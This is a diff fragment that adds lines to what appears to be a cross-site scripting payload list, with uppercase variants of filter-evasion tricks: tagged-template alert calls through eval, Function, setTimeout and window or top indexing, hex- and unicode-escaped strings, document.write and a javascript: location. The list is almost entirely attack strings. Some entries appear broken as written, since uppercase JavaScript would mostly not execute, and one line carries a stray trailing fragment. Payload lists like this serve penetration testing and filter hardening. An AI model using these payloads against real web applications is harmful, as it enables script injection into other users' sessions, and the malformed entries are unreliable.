@@ -26,3 +26,32 @@
 <isindex onfocus=alert(1) autofocus>
 <x onclick=alert(1)>
 <math><mtext onmouseover=alert(1)>Hover</mtext></math>
+
+<script>eval`ALERT\`XSS\``</script> -> PS
+ALERT`XSS`
+EVAL`ALERT\`XSS\``
+TOP['ALERT']`XSS`
+TOP["ALERT"]`XSS`
+SELF['ALERT']`XSS`
+SELF["ALERT"]`XSS`
+WINDOW['ALERT']`XSS`
+WINDOW["ALERT"]`XSS`
+THIS['ALERT']`XSS`
+THIS["ALERT"]`XSS`
+FUNCTION`ALERT\`XSS\``
+SETTIMEOUT`ALERT\`XSS\``
+SETINTERVAL`ALERT\`XSS\``
+VAR X=`ALERT\`XSS\``;EVAL X
+LET X=`ALERT\`XSS\``;EVAL X
+CONST X=`ALERT\`XSS\``;EVAL X
+VAR A=TOP['ALERT'];A`XSS`
+VAR A=TOP["ALERT"];A`XSS`
+VAR A=WINDOW['ALERT'];A`XSS`
+VAR A=SELF['ALERT'];A`XSS`
+TOP[`ALERT`]`XSS`
+THIS[`ALERT`]`XSS`
+WINDOW[`ALERT`]`XSS`
+EVAL`\\x61\\x6c\\x65\\x72\\x74\\x60\\x58\\x53\\x53\\x60` // Encoded "alert`XSS`"
+EVAL`\\u0061\\u006c\\u0065\\u0072\\u0074\\u0060\\u0058\\u0053\\u0053\\u0060`
+DOCUMENT.WRITE`<H1>XSS</H1>`
+LOCATION=`JAVASCRIPT:ALERT\`XSS\``
